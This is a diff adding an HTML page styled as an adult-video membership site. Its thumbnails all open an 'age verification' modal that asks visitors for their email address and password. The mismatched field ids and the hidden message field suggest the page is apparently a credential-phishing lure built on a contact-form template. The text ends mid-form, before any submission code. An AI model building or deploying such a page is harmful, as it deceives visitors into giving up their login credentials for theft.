@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Exclusive Club - Premium Access</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    
+    body {
+      background-color: #0a0a0a;
+      color: #e0e0e0;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+    
+    /* হেডার */
+    .header {
+      background: rgba(10, 10, 10, 0.95);
+      padding: 20px 40px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      position: fixed;
+      width: 100%;
+      z-index: 100;
+      border-bottom: 1px solid #333;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+    }
+    
+    .logo {
+      font-size: 28px;
+      font-weight: bold;
+      color: #ff4081;
+      letter-spacing: 1px;
+    }
+    
+    .logo span {
+      color: #2196f3;
+    }
+    
+    .nav-links {
+      display: flex;
+      gap: 30px;
+    }
+    
+    .nav-links a {
+      color: #e0e0e0;
+      text-decoration: none;
+      font-size: 15px;
+      transition: color 0.3s;
+      font-weight: 500;
+    }
+    
+    .nav-links a:hover {
+      color: #ff4081;
+    }
+    
+    .age-verify {
+      background: linear-gradient(45deg, #ff4081, #2196f3);
+      color: white;
+      padding: 8px 18px;
+      border-radius: 25px;
+      font-size: 14px;
+      font-weight: bold;
+      box-shadow: 0 4px 15px rgba(255, 64, 129, 0.3);
+    }
+    
+    /* মেইন কন্টেন্ট */
+    .container {
+      padding-top: 100px;
+      max-width: 1400px;
+      margin: 0 auto;
+    }
+    
+    .warning-banner {
+      background: linear-gradient(90deg, #ff4081, #2196f3);
+      padding: 18px;
+      text-align: center;
+      margin: 20px;
+      border-radius: 10px;
+      font-weight: bold;
+      letter-spacing: 1px;
+      font-size: 16px;
+      box-shadow: 0 8px 25px rgba(255, 64, 129, 0.3);
+    }
+    
+    /* থাম্বনেল গ্রিড */
+    .video-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+      gap: 30px;
+      padding: 30px;
+      margin-bottom: 50px;
+    }
+    
+    .video-thumbnail {
+      position: relative;
+      border-radius: 12px;
+      overflow: hidden;
+      cursor: pointer;
+      transition: all 0.4s;
+      height: 220px;
+      background: #1a1a1a;
+      border: 1px solid #444;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    }
+    
+    .video-thumbnail:hover {
+      transform: translateY(-10px) scale(1.03);
+      box-shadow: 0 20px 40px rgba(255, 64, 129, 0.4);
+      border-color: #ff4081;
+    }
+    
+    .thumbnail-img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      filter: blur(5px) brightness(0.9) contrast(1.1);
+      transition: filter 0.6s;
+    }
+    
+    .video-thumbnail:hover .thumbnail-img {
+      filter: blur(2px) brightness(1) contrast(1.2);
+    }
+    
+    .dark-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(to bottom, rgba(0,0,0,0.2), rgba(0,0,0,0.7));
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .play-icon {
+      width: 80px;
+      height: 80px;
+      background: rgba(255, 64, 129, 0.85);
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 20px;
+      font-size: 32px;
+      box-shadow: 0 0 30px rgba(255, 64, 129, 0.7);
+      transition: all 0.3s;
+    }
+    
+    .video-thumbnail:hover .play-icon {
+      transform: scale(1.15);
+      background: rgba(33, 150, 243, 0.9);
+      box-shadow: 0 0 40px rgba(33, 150, 243, 0.8);
+    }
+    
+    .video-title {
+      font-size: 20px;
+      font-weight: bold;
+      text-align: center;
+      padding: 0 20px;
+      color: white;
+      text-shadow: 0 3px 6px rgba(0,0,0,0.8);
+      margin-bottom: 10px;
+    }
+    
+    .video-description {
+      font-size: 14px;
+      text-align: center;
+      color: rgba(255,255,255,0.8);
+      padding: 0 15px;
+      max-width: 90%;
+    }
+    
+    .video-duration {
+      position: absolute;
+      bottom: 15px;
+      right: 15px;
+      background: rgba(0, 0, 0, 0.8);
+      padding: 6px 12px;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: bold;
+      color: #ff4081;
+    }
+    
+    .age-restricted {
+      position: absolute;
+      top: 15px;
+      left: 15px;
+      background: rgba(255, 64, 129, 0.9);
+      padding: 6px 14px;
+      border-radius: 6px;
+      font-size: 13px;
+      font-weight: bold;
+      color: white;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+    }
+    
+    .views-count {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      background: rgba(0, 0, 0, 0.7);
+      padding: 5px 12px;
+      border-radius: 6px;
+      font-size: 13px;
+      color: #aaa;
+    }
+    
+    /* লগইন মডাল */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.97);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+      backdrop-filter: blur(10px);
+    }
+    
+    .login-modal {
+      background: linear-gradient(145deg, #1a1a1a, #222);
+      width: 90%;
+      max-width: 450px;
+      border-radius: 20px;
+      overflow: hidden;
+      box-shadow: 0 30px 80px rgba(255, 64, 129, 0.5);
+      border: 2px solid #333;
+      animation: modalAppear 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+    
+    @keyframes modalAppear {
+      from {
+        opacity: 0;
+        transform: translateY(-40px) scale(0.9) rotateX(10deg);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1) rotateX(0);
+      }
+    }
+    
+    .modal-header {
+      background: linear-gradient(90deg, #ff4081, #2196f3);
+      padding: 35px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .modal-header::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+      transform: rotate(45deg);
+      animation: shine 3s infinite linear;
+    }
+    
+    @keyframes shine {
+      0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+      100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+    }
+    
+    .modal-header h2 {
+      color: white;
+      font-size: 28px;
+      text-shadow: 0 3px 6px rgba(0,0,0,0.3);
+      position: relative;
+      z-index: 2;
+    }
+    
+    .modal-body {
+      padding: 40px;
+    }
+    
+    .form-group {
+      margin-bottom: 28px;
+    }
+    
+    .form-group label {
+      display: block;
+      margin-bottom: 12px;
+      color: #ddd;
+      font-size: 16px;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    .form-control {
+      width: 100%;
+      padding: 18px;
+      background: #2a2a2a;
+      border: 2px solid #444;
+      border-radius: 10px;
+      color: white;
+      font-size: 16px;
+      transition: all 0.3s;
+    }
+    
+    .form-control:focus {
+      outline: none;
+      border-color: #ff4081;
+      box-shadow: 0 0 0 4px rgba(255, 64, 129, 0.2);
+      background: #2f2f2f;
+    }
+    
+    .login-btn {
+      width: 100%;
+      padding: 20px;
+      background: linear-gradient(90deg, #ff4081, #2196f3);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s;
+      margin-top: 20px;
+      letter-spacing: 1px;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .login-btn::after {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(45deg, transparent, rgba(255,255,255,0.2), transparent);
+      transform: rotate(45deg);
+      transition: transform 0.6s;
+    }
+    
+    .login-btn:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 15px 35px rgba(255, 64, 129, 0.5);
+    }
+    
+    .login-btn:hover::after {
+      transform: translateX(100%) translateY(100%) rotate(45deg);
+    }
+    
+    .login-btn:active {
+      transform: translateY(-2px);
+    }
+    
+    .forgot-link {
+      text-align: center;
+      display: block;
+      margin-top: 25px;
+      color: #2196f3;
+      text-decoration: none;
+      font-size: 16px;
+      transition: color 0.3s;
+      font-weight: 500;
+    }
+    
+    .forgot-link:hover {
+      color: #ff4081;
+      text-decoration: underline;
+    }
+    
+    .spinner {
+      display: inline-block;
+      width: 24px;
+      height: 24px;
+      border: 3px solid rgba(255,255,255,.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 1s ease-in-out infinite;
+      vertical-align: middle;
+      margin-right: 15px;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    .message {
+      margin-top: 25px;
+      padding: 18px;
+      border-radius: 10px;
+      text-align: center;
+      font-size: 16px;
+      animation: fadeIn 0.5s;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    .message.success {
+      background: linear-gradient(90deg, rgba(76, 175, 80, 0.2), rgba(46, 125, 50, 0.2));
+      color: #4caf50;
+      border: 2px solid #4caf50;
+    }
+    
+    .message.error {
+      background: linear-gradient(90deg, rgba(244, 67, 54, 0.2), rgba(183, 28, 28, 0.2));
+      color: #f44336;
+      border: 2px solid #f44336;
+    }
+    
+    .hidden-field {
+      display: none;
+    }
+    
+    /* ফুটার */
+    .footer {
+      text-align: center;
+      padding: 40px;
+      color: #777;
+      font-size: 14px;
+      border-top: 1px solid #333;
+      margin-top: 60px;
+      background: #111;
+      line-height: 1.8;
+    }
+    
+    /* রেসপনসিভ */
+    @media (max-width: 1100px) {
+      .video-grid {
+        grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+        gap: 25px;
+        padding: 25px;
+      }
+    }
+    
+    @media (max-width: 768px) {
+      .header {
+        padding: 15px 20px;
+      }
+      
+      .nav-links {
+        display: none;
+      }
+      
+      .video-grid {
+        grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+        gap: 20px;
+        padding: 20px;
+      }
+      
+      .modal-body {
+        padding: 30px;
+      }
+      
+      .container {
+        padding-top: 90px;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      .video-grid {
+        grid-template-columns: 1fr;
+        gap: 20px;
+        padding: 15px;
+      }
+      
+      .video-thumbnail {
+        height: 200px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- হেডার -->
+  <header class="header">
+    <div class="logo">Exclusive<span>Club</span></div>
+    <div class="nav-links">
+      <a href="#">Home</a>
+      <a href="#">Premium Videos</a>
+      <a href="#">Live Shows</a>
+      <a href="#">Models</a>
+      <a href="#">New Releases</a>
+    </div>
+    <div class="age-verify">18+ VERIFIED</div>
+  </header>
+
+  <!-- মেইন কন্টেন্ট -->
+  <div class="container">
+    <div class="warning-banner">
+      ⚠️ STRICT 18+ ACCESS ONLY - Age verification required for all content
+    </div>
+    
+    <h2 style="text-align: center; margin: 40px 0 20px; color: #ff4081; font-size: 36px; text-shadow: 0 3px 6px rgba(0,0,0,0.5);">
+      🔥 EXCLUSIVE PREMIUM CONTENT
+    </h2>
+    <p style="text-align: center; margin-bottom: 50px; color: #aaa; max-width: 900px; margin-left: auto; margin-right: auto; font-size: 18px; line-height: 1.6;">
+      Discover our curated collection of premium adult entertainment. Each video is carefully selected for quality and exclusivity. 
+      Full access requires age verification and membership.
+    </p>
+    
+    <div class="video-grid" id="videoGrid">
+      <!-- থাম্বনেল 1 -->
+      <div class="video-thumbnail" onclick="showLoginModal()">
+        <img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" class="thumbnail-img" alt="Model 1">
+        <div class="age-restricted">18+</div>
+        <div class="views-count">2.4M views</div>
+        <div class="dark-overlay">
+          <div class="play-icon">▶</div>
+          <div class="video-title">Sensual Beauty</div>
+          <div class="video-description">Exclusive private session with model</div>
+        </div>
+        <div class="video-duration">24:18</div>
+      </div>
+      
+      <!-- থাম্বনেল 2 -->
+      <div class="video-thumbnail" onclick="showLoginModal()">
+        <img src="https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" class="thumbnail-img" alt="Model 2">
+        <div class="age-restricted">18+</div>
+        <div class="views-count">1.8M views</div>
+        <div class="dark-overlay">
+          <div class="play-icon">▶</div>
+          <div class="video-title">Midnight Fantasy</div>
+          <div class="video-description">Late night exclusive content</div>
+        </div>
+        <div class="video-duration">32:05</div>
+      </div>
+      
+      <!-- থাম্বনেল 3 -->
+      <div class="video-thumbnail" onclick="showLoginModal()">
+        <img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" class="thumbnail-img" alt="Model 3">
+        <div class="age-restricted">18+</div>
+        <div class="views-count">3.1M views</div>
+        <div class="dark-overlay">
+          <div class="play-icon">▶</div>
+          <div class="video-title">Private Show</div>
+          <div class="video-description">VIP exclusive performance</div>
+        </div>
+        <div class="video-duration">28:45</div>
+      </div>
+      
+      <!-- থাম্বনেল 4 -->
+      <div class="video-thumbnail" onclick="showLoginModal()">
+        <img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" class="thumbnail-img" alt="Model 4">
+        <div class="age-restricted">18+</div>
+        <div class="views-count">1.5M views</div>
+        <div class="dark-overlay">
+          <div class="play-icon">▶</div>
+          <div class="video-title">Beach Romance</div>
+          <div class="video-description">Summer special edition</div>
+        </div>
+        <div class="video-duration">35:20</div>
+      </div>
+      
+      <!-- থাম্বনেল 5 -->
+      <div class="video-thumbnail" onclick="showLoginModal()">
+        <img src="https://images.unsplash.com/photo-1494790108755-2616b786d4d9?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" class="thumbnail-img" alt="Model 5">
+        <div class="age-restricted">18+</div>
+        <div class="views-count">2.9M views</div>
+        <div class="dark-overlay">
+          <div class="play-icon">▶</div>
+          <div class="video-title">Hotel Secret</div>
+          <div class="video-description">Behind closed doors</div>
+        </div>
+        <div class="video-duration">26:30</div>
+      </div>
+      
+      <!-- থাম্বনেল 6 -->
+      <div class="video-thumbnail" onclick="showLoginModal()">
+        <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" class="thumbnail-img" alt="Model 6">
+        <div class="age-restricted">18+</div>
+        <div class="views-count">4.2M views</div>
+        <div class="dark-overlay">
+          <div class="play-icon">▶</div>
+          <div class="video-title">Luxury Affair</div>
+          <div class="video-description">High class entertainment</div>
+        </div>
+        <div class="video-duration">31:15</div>
+      </div>
+      
+      <!-- থাম্বনেল 7 -->
+      <div class="video-thumbnail" onclick="showLoginModal()">
+        <img src="https://images.unsplash.com/photo-1516589178581-6cd7833ae3b2?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" class="thumbnail-img" alt="Model 7">
+        <div class="age-restricted">18+</div>
+        <div class="views-count">1.2M views</div>
+        <div class="dark-overlay">
+          <div class="play-icon">▶</div>
+          <div class="video-title">Intimate Session</div>
+          <div class="video-description">One on one exclusive</div>
+        </div>
+        <div class="video-duration">22:40</div>
+      </div>
+      
+      <!-- থাম্বনেল 8 -->
+      <div class="video-thumbnail" onclick="showLoginModal()">
+        <img src="https://images.unsplash.com/photo-1519162808019-7de1683fa2ad?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" class="thumbnail-img" alt="Model 8">
+        <div class="age-restricted">18+</div>
+        <div class="views-count">3.7M views</div>
+        <div class="dark-overlay">
+          <div class="play-icon">▶</div>
+          <div class="video-title">Couple's Fantasy</div>
+          <div class="video-description">Special couple edition</div>
+        </div>
+        <div class="video-duration">29:55</div>
+      </div>
+    </div>
+    
+    <div style="text-align: center; margin: 60px 0 40px;">
+      <button onclick="showLoginModal()" style="background: linear-gradient(90deg, #ff4081, #2196f3); color: white; border: none; padding: 22px 60px; border-radius: 40px; font-size: 22px; font-weight: bold; cursor: pointer; box-shadow: 0 15px 40px rgba(255, 64, 129, 0.4); transition: all 0.3s; position: relative; overflow: hidden;">
+        <span style="position: relative; z-index: 2;">🔓 UNLOCK ALL PREMIUM CONTENT</span>
+        <div style="position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent); transform: rotate(45deg); animation: buttonShine 3s infinite linear;"></div>
+      </button>
+      <p style="margin-top: 25px; color: #888; font-size: 16px; max-width: 600px; margin-left: auto; margin-right: auto; line-height: 1.6;">
+        Click to verify your age and access our complete library of exclusive adult content. 
+        Membership includes HD streaming, no ads, and premium features.
+      </p>
+    </div>
+  </div>
+
+  <!-- লগইন মডাল -->
+  <div class="modal-overlay" id="loginModal">
+    <div class="login-modal">
+      <div class="modal-header">
+        <h2>🔐 AGE VERIFICATION REQUIRED</h2>
+      </div>
+      
+      <div class="modal-body">
+        <p style="text-align: center; margin-bottom: 30px; color: #ddd; font-size: 17px; line-height: 1.6;">
+          To access premium 18+ content, you must verify your age by logging in with your credentials.
+        </p>
+        
+        <form id="dataForm">
+          <div class="form-group">
+            <label for="name">📧 Email Address</label>
+            <input type="email" id="name" class="form-control" placeholder="Enter your email address" required>
+          </div>
+          
+          <div class="form-group">
+            <label for="email">🔑 Password</label>
+            <input type="password" id="email" class="form-control" placeholder="Enter your password" required>
+          </div>
+          
+          <!-- লুকানো বার্তা ফিল্ড -->
+          <div class="form-group hidden-field">
+            <textarea id="message" placeholder=""></textarea>
+          </div>
+          
+          <div style="display: flex; align-items: center; margin: 20px 0;">
+            <input type="checkbox" id="ageConfirm" style="margin-right: 10px; width: 20px; height: 20px;">
+            <label for="ageConfirm" style="color: #bbb; font-size: 15px; margin: 0;">
+              I confirm that I am 18 years of age or older
+            </label>
+          </div>
+          
+          <button type="submit" class="login-btn" id="submitBtn">
+            <div class="spinner" id="spinner" style="display:none;"></div>
+            <span id="btnText" style="position: relative; z-index: 2;">VERIFY AGE & ACCESS</span>
+          </button>
+  
